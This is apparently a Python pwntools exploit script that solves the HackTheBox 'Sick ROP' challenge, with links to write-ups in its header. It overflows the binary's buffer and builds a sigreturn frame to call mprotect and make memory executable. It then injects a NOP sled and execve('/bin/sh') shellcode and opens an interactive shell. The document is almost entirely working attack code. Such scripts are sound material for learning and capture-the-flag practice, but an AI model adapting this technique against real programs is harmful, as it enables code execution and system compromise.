'''
### SROP ###
### Sigreturn ROP ###

https://corruptedprotocol.medium.com/sickrop-hackthebox-introduction-to-sigreturn-oriented-programming-srop-8b27727cd441

https://shakuganz.com/2022/07/11/hackthebox-sick-rop-write-up/
https://fdlucifer.github.io/2021/01/11/sick-rop/

'''

from pwn import *

io = process('./sick_rop')

context.arch = 'amd64'

elf = ELF('./sick_rop')

#set the value of RAX, we don't have POP RAX; RET here...
def set_rax(num):
	# need to -1 as '\n' will also be counted in read()
	io.sendline('A'*(num-1))
	io.recv()

OFFSET_TO_RET = 0x20+0x08
padding = 'A'*OFFSET_TO_RET

# ROPgadget --binary ./sick_rop --only "syscall"
syscall_addr = 0x401014
# the address of vuln function in symtab
# pwndbg> search -p 0x40102E
vuln_ptr = 0x4010d8


shellcode =  """nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		mov rdi, 0x68732f6e69622f
                push rdi
                mov rdi, rsp
                mov rax, 0x3b
                xor rsi, rsi
                xor rdx, rdx
                syscall"""
assembled_shellcode = asm(shellcode)

frame = SigreturnFrame()
frame.rax = constants.SYS_mprotect
frame.rdi = 0x400000   #start of the virtual address
frame.rsi = 0x10000    #length
frame.rdx = 7	       #permission rwx
frame.rsp = vuln_ptr
frame.rip = syscall_addr

# p64(binary.symbols['vuln']) is to set RAX to call SYS_sigreturn.
payload = padding + p64(elf.symbols['vuln']) + p64(syscall_addr) + str(frame)

io.sendline(payload)
io.recv()
set_rax(0xf)    #0xf -> call rt_sigreturn

payload = padding + p64(vuln_ptr+0x20) + assembled_shellcode
io.sendline(payload)
io.recv()
io.interactive()
